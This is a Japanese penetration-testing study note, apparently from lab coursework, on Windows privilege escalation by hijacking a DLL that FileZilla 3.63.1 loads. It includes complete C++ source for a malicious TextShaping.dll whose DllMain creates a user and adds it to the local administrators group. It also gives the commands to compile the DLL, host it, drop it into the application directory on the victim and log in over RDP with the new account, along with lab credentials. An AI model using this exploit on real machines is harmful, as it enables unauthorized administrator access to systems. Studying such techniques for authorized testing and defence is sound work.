---
title: DLL Hijacking
parent: Win Privilege Escalation
grand_parent: Red Team
---

# 02_DLL Hijacking


## 1. サービスバイナリが使用するDLLを上書き
## 2. DLLの検索順序をハイジャックする
標準的な検索順序
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```bash
xfreerdp3 /u:"steve" /p:'securityIsNotAnOption++++++' /v:192.168.203.220 /dynamic-resolution
```

インストールされているアプリケーションを列挙
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
![](assets/images/Pasted%20image%2020250702123350.png)
```txt
※オンラインリソースによると、このFileZilla 3.63.1には[DLLハイジャックの脆弱性](https://filezilla-project.org/)があるようです。アプリケーションを起動すると、インストールディレクトリから**TextShaping.dll** ファイルを読み込もうとします。ここに悪意のあるDLLを配置できれば、誰かがFileZilla FTPクライアントを実行しようとするたびに、そのDLLがユーザーの権限で読み込まれることになります。
```

FileZilla ディレクトリにファイルを書き込むことができるかどうかを確認
```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

[_Process Monitor_](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を使用すると 、プロセス、スレッド、ファイルシステム、レジストリ関連のアクティビティに関するリアルタイム情報を表示できます。FileZilla_によって_読み込まれるすべての DLL を特定し、不足している DLL を検出することが目標です。サービスバイナリで使用される DLL のリストを取得したら、それらの権限を確認し、悪意のある DLL に置き換えられる可能性がないかどうかを確認できます。また、不足している DLL が見つかった場合は、DLL の検索順序に従って独自の DLL を提供することもできます。

残念ながら、Process Monitorを起動してデータを収集するには管理者権限が必要です。しかし、侵入テストの標準的な手順としては、サービスバイナリをローカルマシンにコピーすることが挙げられます。このシステムでは、サービスをローカルにインストールし、管理者権限でProcess Monitorを使用してすべてのDLLアクティビティを一覧表示できます。

各DLLには、プロセスまたはスレッドがDLLをアタッチする際に実行される、オプションのエントリポイント関数 DllMain があります。
この関数には通常、 
- DLL_PROCESS_ATTACH 
- DLL_THREAD_ATTACH
- DLL_THREAD_DETACH
- DLL_PROCESS_DETACH 
という4つのケースが含まれます。これらのケー_は _、_ DLL_が_プロセス_またはスレッドによってロードまたはアンロードされる状況を処理します。これらは通常、DLLの初期化タスクやDLLの終了に関連するタスクを実行するために使用されます。_

Kali
```bash
vi TextShaping.cpp                                                             
```

TextShaping.cpp
```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```bash
# コンパイル
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
# --shared DLLをビルドすることを指定

python3 -m http.server 80
```

Victim
```powershell
iwr -uri http://192.168.45.175/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'

# 数分待つ
net user
# dave3を確認
net localgroup administrators

```
DLLの実行権限はアプリケーションの起動時に使用された権限に依存することに留意することが重要

Kali
```bash
xfreerdp3 /u:"dave3" /p:'password123!' /v:192.168.179.220 /dynamic-resolution
```
---
